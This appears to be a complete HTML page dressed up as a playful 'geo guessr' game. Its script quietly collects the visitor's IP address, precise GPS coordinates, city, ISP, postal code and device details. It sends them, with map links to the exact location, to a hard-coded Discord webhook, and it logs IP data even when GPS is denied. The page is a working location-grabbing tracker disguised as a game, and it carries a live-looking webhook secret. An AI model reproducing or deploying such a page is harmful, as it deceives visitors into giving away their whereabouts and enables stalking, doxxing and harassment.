<!DOCTYPE html>
<html>
<head>
    <title>geo guess :3</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; 
            background: #36393f; 
            color: #dcddde; 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px;
        }
        .container { 
            background: #2f3136; 
            border-radius: 8px; 
            padding: 30px; 
            max-width: 500px; 
            width: 100%; 
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); 
            border: 1px solid #202225;
        }
        h1 { 
            color: #fff; 
            font-size: 24px; 
            margin-bottom: 8px; 
            font-weight: 600; 
        }
        .subtitle { 
            color: #b9bbbe; 
            margin-bottom: 24px; 
            font-size: 16px; 
        }
        .emoji { 
            font-size: 40px; 
            text-align: center; 
            margin-bottom: 20px; 
        }
        button { 
            background: #5865f2; 
            color: white; 
            border: none; 
            padding: 12px 24px; 
            border-radius: 4px; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: pointer; 
            width: 100%; 
            transition: background-color 0.2s ease; 
            margin-top: 16px;
        }
        button:hover { 
            background: #4752c4; 
        }
        button:disabled { 
            background: #4f545c; 
            cursor: not-allowed; 
            opacity: 0.5;
        }
        .status-box { 
            background: #202225; 
            border-radius: 4px; 
            padding: 16px; 
            margin-top: 20px; 
            border-left: 4px solid #5865f2; 
            display: none;
        }
        .loading { 
            display: none; 
            text-align: center; 
            margin: 20px 0; 
        }
        .dot { 
            display: inline-block; 
            width: 8px; 
            height: 8px; 
            border-radius: 50%; 
            background: #5865f2; 
            margin: 0 4px; 
            animation: bounce 1.4s infinite ease-in-out both;
        }
        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
        .permission-note { 
            font-size: 14px; 
            color: #72767d; 
            margin-top: 12px; 
            text-align: center;
        }
        .cute { 
            color: #b9bbbe; 
            font-size: 14px; 
            margin-top: 8px; 
            text-align: center;
        }
        .discord-input { 
            background: #40444b; 
            border: 1px solid #202225; 
            border-radius: 4px; 
            padding: 10px; 
            color: #dcddde; 
            font-size: 16px; 
            width: 100%; 
            margin-top: 8px;
        }
        .discord-input:focus { 
            outline: none; 
            border-color: #5865f2;
        }
        .label { 
            display: block; 
            margin-top: 16px; 
            color: #b9bbbe; 
            font-size: 14px; 
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="emoji">üåç‚ú®</div>
        <h1>geo guessr by me :3</h1>
        <div class="subtitle">click to test your location accuracy, twin!!</div>
        
        <div class="label">enter your nickname (optional):</div>
        <input type="text" class="discord-input" id="nickname" placeholder="geo guesser :3" maxlength="32">
        
        <button id="startBtn">start guessing!!</button>
        
        <div class="loading" id="loading">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        
        <div class="status-box" id="status"></div>
        
        <div class="permission-note">
            need location permission to calculate your accuracy score!!
        </div>
        <div class="cute">made with ‚ù§Ô∏è by ur twin~~</div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'couldnt get ip :(';
            }
        }
        
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ allowed: false, error: 'no gps support :(' });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            allowed: true,
                            lat: pos.coords.latitude.toFixed(6),
                            lon: pos.coords.longitude.toFixed(6),
                            accuracy: Math.round(pos.coords.accuracy) + 'm',
                            speed: pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : 'not moving',
                            timestamp: new Date().toISOString()
                        });
                    },
                    (error) => {
                        let msg = 'u denied location :(';
                        if (error.code === 2) msg = 'location unavailable :o';
                        if (error.code === 3) msg = 'took too long :/';
                        resolve({ allowed: false, error: msg });
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function getIPLocation(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await res.json();
                return {
                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'idk',
                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'idk',
                    city: data.city || 'somewhere',
                    region: data.region || 'some region',
                    country: data.country_name || 'some country',
                    isp: data.org || 'unknown isp',
                    zip: data.postal || '???',
                    timezone: data.timezone || 'idk'
                };
            } catch {
                return {
                    lat: 'failed',
                    lon: 'failed',
                    city: 'failed',
                    region: 'failed',
                    country: 'failed',
                    isp: 'failed',
                    zip: 'failed',
                    timezone: 'failed'
                };
            }
        }
        
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            
            let device = 'desktop';
            if (/mobile/i.test(ua)) device = 'phone';
            if (/tablet/i.test(ua)) device = 'tablet';
            
            let os = 'unknown';
            if (/windows/i.test(ua)) os = 'windows';
            else if (/mac/i.test(ua)) os = 'mac';
            else if (/linux/i.test(ua)) os = 'linux';
            else if (/android/i.test(ua)) os = 'android';
            else if (/iphone|ipad/i.test(ua)) os = 'ios';
            
            let browser = 'unknown';
            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'chrome';
            else if (/firefox/i.test(ua)) browser = 'firefox';
            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'safari';
            else if (/edge/i.test(ua)) browser = 'edge';
            else if (/opera/i.test(ua)) browser = 'opera';
            
            return {
                device,
                os,
                browser,
                language: navigator.language || 'en',
                screen: `${screen.width}x${screen.height}`,
                platform: navigator.platform
            };
        }
        
        function calculateDistance(lat1, lon1, lat2, lon2) {
            if (lat1 === 'failed' || lat2 === 'failed') return '?? km';
            
            const R = 6371;
            const dLat = (parseFloat(lat2) - parseFloat(lat1)) * Math.PI / 180;
            const dLon = (parseFloat(lon2) - parseFloat(lon1)) * Math.PI / 180;
            const a = 
                Math.sin(dLat/2) * Math.sin(dLat/2) +
                Math.cos(parseFloat(lat1) * Math.PI / 180) * Math.cos(parseFloat(lat2) * Math.PI / 180) *
                Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return (R * c).toFixed(2) + ' km';
        }
        
        document.getElementById('startBtn').addEventListener('click', async function() {
            const btn = this;
            const status = document.getElementById('status');
            const loading = document.getElementById('loading');
            const nickname = document.getElementById('nickname').value || 'anon twin :3';
            
            btn.disabled = true;
            btn.textContent = 'guessing...';
            loading.style.display = 'block';
            status.style.display = 'none';
            
            try {
                // show steps
                status.innerHTML = '<div style="color: #b9bbbe;">getting ur ip...</div>';
                status.style.display = 'block';
                
                const ip = await getIP();
                
                status.innerHTML = '<div style="color: #b9bbbe;">asking for location (pls allow!!)...</div>';
                const gps = await getGPS();
                
                status.innerHTML = '<div style="color: #b9bbbe;">checking ip location...</div>';
                const ipLocation = await getIPLocation(ip);
                
                status.innerHTML = '<div style="color: #b9bbbe;">seeing ur device...</div>';
                const device = getDeviceInfo();
                
                const now = new Date();
                const distance = calculateDistance(
                    gps.allowed ? gps.lat : ipLocation.lat,
                    gps.allowed ? gps.lon : ipLocation.lon,
                    ipLocation.lat,
                    ipLocation.lon
                );
                
                // send to discord
                const embed = {
                    title: "üåç new geo guess!!",
                    color: gps.allowed ? 0x57f287 : 0xfaa81a,
                    fields: [
                        {
                            name: "üë§ user info",
                            value: `nickname: ${nickname}\nip: \`${ip}\`\ntime: ${now.toLocaleTimeString()}`,
                            inline: true
                        },
                        {
                            name: "üìç location stuff",
                            value: `gps allowed: ${gps.allowed ? 'yes!!' : 'no :('}\naccuracy: ${gps.allowed ? gps.accuracy : 'none'}\nspeed: ${gps.allowed ? gps.speed : 'idk'}`,
                            inline: true
                        },
                        {
                            name: "üéØ coordinates",
                            value: `gps: ${gps.allowed ? `${gps.lat}, ${gps.lon}` : 'denied'}\nip loc: ${ipLocation.city}, ${ipLocation.country}\ndistance: ${distance}`,
                            inline: false
                        },
                        {
                            name: "üíª device info",
                            value: `device: ${device.device}\nos: ${device.os}\nbrowser: ${device.browser}\nscreen: ${device.screen}`,
                            inline: true
                        },
                        {
                            name: "üîó maps links",
                            value: gps.allowed 
                                ? `[exact location](https://maps.google.com/?q=${gps.lat},${gps.lon}) | [ip location](https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon})`
                                : `[ip location only](https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon})`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `geo guessr by twin ‚Ä¢ ${gps.allowed ? 'got gps!!' : 'ip only'}`
                    },
                    timestamp: now.toISOString()
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [embed],
                        username: "geo guessr bot :3",
                        avatar_url: "https://cdn.discordapp.com/emojis/1090923364466765834.webp"
                    })
                });
                
                // show cute result to user
                loading.style.display = 'none';
                btn.style.display = 'none';
                
                if (gps.allowed) {
                    status.innerHTML = `
                        <div style="color: #57f287; font-size: 18px; margin-bottom: 10px;">
                            ‚úÖ guessed successfully!!
                        </div>
                        <div style="color: #b9bbbe; margin-bottom: 15px;">
                            ur at: ${gps.lat}, ${gps.lon}<br>
                            accuracy: ${gps.accuracy}<br>
                            distance error: ${distance}<br>
                            device: ${device.device} ${device.os}
                        </div>
                        <div style="color: #72767d; font-size: 14px;">
                            thanks for playing, twin!! data sent to my discord :3
                        </div>
                    `;
                    status.style.borderLeftColor = '#57f287';
                } else {
                    status.innerHTML = `
                        <div style="color: #faa81a; font-size: 18px; margin-bottom: 10px;">
                            ‚ö†Ô∏è partial guess :/
                        </div>
                        <div style="color: #b9bbbe; margin-bottom: 15px;">
                            u denied gps :(<br>
                            ip location: ${ipLocation.city}, ${ipLocation.country}<br>
                            ur ip: ${ip}<br>
                            device: ${device.device} ${device.os}
                        </div>
                        <div style="color: #72767d; font-size: 14px;">
                            allow location next time for better accuracy, twin!! still logged tho :3
                        </div>
                    `;
                    status.style.borderLeftColor = '#faa81a';
                }
                
            } catch (error) {
                console.error('error:', error);
                loading.style.display = 'none';
                status.innerHTML = `
                    <div style="color: #ed4245; font-size: 18px; margin-bottom: 10px;">
                        ‚ùå oops error!!
                    </div>
                    <div style="color: #b9bbbe;">
                        something went wrong :(<br>
                        try again maybe??
                    </div>
                `;
                status.style.borderLeftColor = '#ed4245';
                status.style.display = 'block';
                btn.disabled = false;
                btn.textContent = 'try again??';
                btn.style.display = 'block';
            }
        });
        
        // enter key support
        document.getElementById('nickname').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('startBtn').click();
            }
        });
    </script>
</body>
</html>
